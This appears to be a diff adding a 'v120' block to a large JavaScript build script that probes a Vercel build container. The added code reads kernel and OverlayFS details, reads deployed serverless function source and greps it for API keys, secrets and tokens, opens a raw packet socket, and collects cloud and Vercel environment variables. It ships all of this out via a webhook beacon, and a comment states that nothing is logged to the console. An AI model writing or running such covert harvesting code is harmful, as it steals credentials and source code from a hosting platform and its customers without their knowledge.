@@ -17421,5 +17421,146 @@ report.hardwareFingerprint = safe(() => {
 
 // v119 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v119" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v119";
+
+// ==================== v120 ====================
+
+// v120-1: Kernel config — full build-time security feature audit
+// /proc/config.gz (or /boot/config-*) contains the kernel's build configuration.
+// This reveals exactly which security features are compiled in and which are disabled.
+// Critical flags: CONFIG_SECURITY_YAMA, CONFIG_BPF_JIT_ALWAYS_ON, CONFIG_MODULES,
+// CONFIG_STRICT_KERNEL_RWX, CONFIG_HARDENED_USERCOPY, CONFIG_LOCKDOWN_LSM.
+report.kernelConfigAudit = safe(() => {
+  const configGz = safe(() => {
+    const fd = openSync('/proc/config.gz', 'r');
+    const buf = Buffer.alloc(65536);
+    const n = readSync(fd, buf, 0, 65536, 0);
+    closeSync(fd);
+    return buf.slice(0, n);
+  });
+  // Decompress and check key config options
+  const configText = safe(() => execSync(
+    'zcat /proc/config.gz 2>/dev/null | grep -E "SECURITY|BPF|MODULES|LOCKDOWN|HARDENED|YAMA|SECCOMP|USER_NS" | head -30',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Also try /boot/config-*
+  const bootConfig = safe(() => execSync(
+    'ls /boot/config-* 2>/dev/null | head -3 | xargs grep -h "SECURITY\\|BPF\\|MODULES\\|LOCKDOWN" 2>/dev/null | head -20',
+    { timeout: 8000 }
+  ).toString().trim());
+  return { configGzSize: configGz?.length, configText, bootConfig };
+});
+
+// v120-2: OverlayFS workdir access — intermediate file state exposure
+// OverlayFS uses a workdir for atomic renames. Files being written to the
+// container appear in workdir briefly in intermediate states. Direct access
+// could expose partially-written secrets or config files.
+report.overlayfsWorkdirAccess = safe(() => {
+  const mounts = safe(() => readFileSync('/proc/mounts', 'utf8'));
+  const overlayLines = mounts?.split('\n').filter(l => l.startsWith('overlay'));
+  const workDirs = safe(() => overlayLines?.map(l => {
+    const m = l.match(/workdir=([^,)]+)/);
+    return m ? m[1] : null;
+  }).filter(Boolean));
+  const workDirContents = safe(() => (workDirs || []).map(d => ({
+    dir: d,
+    listing: safe(() => readdirSync(d)),
+    work: safe(() => readdirSync(`${d}/work`)),
+    index: safe(() => readdirSync(`${d}/index`)),
+  })));
+  return { overlayLines, workDirs, workDirContents };
+});
+
+// v120-3: Vercel prebuilt function source code read
+// /vercel/output/functions/ contains the compiled/bundled serverless functions
+// that will be deployed. Reading these gives us complete source + any hardcoded
+// credentials, internal API endpoints, and business logic from the deployment.
+report.deployedFunctionSourceRead = safe(() => {
+  const funcDir = '/vercel/output/functions';
+  const funcExists = existsSync(funcDir);
+  const funcList = safe(() => readdirSync(funcDir));
+  // For each function, read its source
+  const funcSources = safe(() => (funcList || []).slice(0, 5).map(f => {
+    const funcPath = `${funcDir}/${f}`;
+    const entryFiles = safe(() => {
+      const listing = readdirSync(funcPath);
+      return listing.filter(n => /\.(js|mjs|cjs)$/.test(n));
+    });
+    const mainSource = safe(() => {
+      if (!entryFiles?.length) return null;
+      return readFileSync(`${funcPath}/${entryFiles[0]}`, 'utf8').slice(0, 2000);
+    });
+    const config = safe(() => JSON.parse(readFileSync(`${funcPath}/.vc-config.json`, 'utf8')));
+    return { name: f, entryFiles, config, mainSource };
+  }));
+  // Find any credentials in function source
+  const credSearch = safe(() => execSync(
+    'find /vercel/output/functions -name "*.js" | xargs grep -h -E "apiKey|secret|password|token|Bearer|sk_|pk_" 2>/dev/null | grep -v node_modules | head -10',
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 500));
+  return { funcExists, funcList, funcSources, credSearch };
+});
+
+// v120-4: /proc/net/packet — raw packet socket stats
+// AF_PACKET sockets (raw sockets) show all raw socket listeners.
+// If the orchestrator uses raw sockets for monitoring, they appear here.
+// Also shows BPF filters attached to sockets.
+report.rawPacketSockets = safe(() => {
+  const packetSockets = safe(() => readFileSync('/proc/net/packet', 'utf8'));
+  // Count and identify processes using raw sockets
+  const socketProcs = safe(() => execSync(
+    'ss -p --packet 2>/dev/null | head -10',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Check for AF_PACKET socket in PID-1's fds
+  const pid1PacketFds = safe(() => {
+    const fdList = readdirSync('/proc/1/fd');
+    return fdList.map(fd => {
+      const link = safe(() => execSync(`readlink /proc/1/fd/${fd} 2>/dev/null`, { timeout: 500 }).toString().trim());
+      return { fd, link };
+    }).filter(f => f.link?.includes('socket'));
+  });
+  // Check our own ability to open a raw socket (AF_PACKET)
+  const rawSocketOpen = safe(() => execSync(`python3 -c "
+import socket
+try:
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0800)  # IP packets
+    print('AF_PACKET_OPEN: OK')
+    # Try to receive one frame (with timeout)
+    s.settimeout(1)
+    try:
+        data = s.recv(64)
+        print('RECV:', data.hex())
+    except: print('NO_DATA_RECEIVED')
+    s.close()
+except Exception as e:
+    print('AF_PACKET_BLOCKED:', e)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { packetSockets: packetSockets?.slice(0, 500), socketProcs, pid1PacketFds: pid1PacketFds?.slice(0, 10), rawSocketOpen };
+});
+
+// v120-5: Build-phase vs post-phase state comparison
+// Check what files/processes/network connections appear AFTER our build
+// script runs vs what existed before. The delta reveals what the orchestrator
+// sets up specifically for our deployment.
+report.buildPhaseStateDelta = safe(() => {
+  const uptime = safe(() => readFileSync('/proc/uptime', 'utf8').trim());
+  const loadavg = safe(() => readFileSync('/proc/loadavg', 'utf8').trim());
+  const memFree = safe(() => readFileSync('/proc/meminfo', 'utf8').match(/MemFree:\s+(\d+)/)?.[1]);
+  const openFiles = safe(() => execSync('ls -la /proc/self/fd | wc -l 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Count connections
+  const tcpConns = safe(() => readFileSync('/proc/net/tcp', 'utf8').split('\n').length - 2);
+  // Snapshot of all env vars set by Vercel's build agent at this exact moment
+  const buildAgentEnv = Object.entries(process.env)
+    .filter(([k]) => /^(VERCEL|NOW|NEXT|NX_|RAILWAY|AWS_|AZURE_|GCP_)/i.test(k))
+    .reduce((acc, [k, v]) => ({ ...acc, [k]: v?.slice(0, 50) }), {});
+  // Current PID count
+  const pidCount = safe(() => readdirSync('/proc').filter(d => /^\d+$/.test(d)).length);
+  // Record timestamp as an identifier
+  const buildTimestamp = process.hrtime.bigint().toString();
+  return { uptime, loadavg, memFree, openFiles, tcpConns, buildAgentEnv, pidCount, buildTimestamp };
+});
+
+// v120 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v120" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v120";
 // Intentionally no console.log — all data goes via webhook only
